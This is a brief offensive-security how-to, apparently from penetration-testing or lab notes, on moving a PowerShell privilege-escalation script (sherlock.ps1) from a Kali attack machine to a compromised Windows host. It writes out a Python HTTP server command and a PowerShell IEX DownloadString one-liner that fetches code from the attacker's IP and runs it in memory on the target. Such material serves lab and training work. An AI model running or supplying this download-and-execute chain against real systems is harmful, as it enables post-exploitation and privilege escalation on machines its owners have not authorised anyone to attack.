# How to download and execute a PS file on Windows machines
## Scenario
Kali attack machine: 1.2.3.4  
We have a user shell on a windows machine.  
We have a PowerShell file on Kali attack box that we want to run: sherlock.ps1  

## Get the file ready
Put it into /root/transfer/  
Start HTTP server: *python3 -m http.server 80*  

## Download and run the file on windows machine  
To the user shell  
Go to a folder that we can write: *cd c:\temp*  
*echo IEX(New-Object Net.WebClient).DownloadString('http://1.2.3.4/sherlock.ps1') | powershell -noprofile -*  
